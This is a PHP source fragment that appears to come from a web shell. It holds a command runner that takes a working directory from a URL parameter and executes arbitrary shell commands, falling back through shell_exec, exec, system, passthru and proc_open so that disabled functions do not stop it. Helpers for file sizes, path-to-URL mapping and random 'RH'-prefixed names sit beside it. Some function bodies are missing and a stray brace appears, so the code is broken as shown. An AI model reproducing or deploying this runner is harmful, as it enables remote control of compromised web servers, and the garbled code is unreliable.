function x($string)

function formatSize($bytes)
{
    if ($bytes >= 1073741824)
        return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576)
        return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024)
        return number_format($bytes / 1024, 2) . ' KB';
    else
        return $bytes . ' B';
}

function permColor($path)

}



function runShellCommand($command)
{
    $output = '';
    $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();
    $currentPath = $isWindows
        ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath)
        : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);

    $command = "cd " . escapeshellarg($currentPath) . " && " . $command . " 2>&1";

    // Fallback chain
    if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $lines);
        $output = implode("\n", $lines);
    } elseif (function_exists('system')) {
        ob_start();
        system($command);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        $output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }

    return $output;
}

function file_path_to_url($file_path)
{
    $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
    $real_path = realpath($file_path);

    if ($real_path === false || strpos($real_path, $doc_root) !== 0) {
        return false;
    }

    $relative = substr($real_path, strlen($doc_root));
    $relative = str_replace('\\', '/', $relative);
    $relative = ltrim($relative, '/');

    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $url = $protocol . $host . '/' . $relative;

    return $url;
}

function generate_random_string($length = 10, $prefix = 'RH')
{
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $random = '';
    $rand_length = $length - strlen($prefix);

    for ($i = 0; $i < $rand_length; $i++) {
        $random .= $chars[random_int(0, strlen($chars) - 1)];
    }

    return $prefix . $random;
}
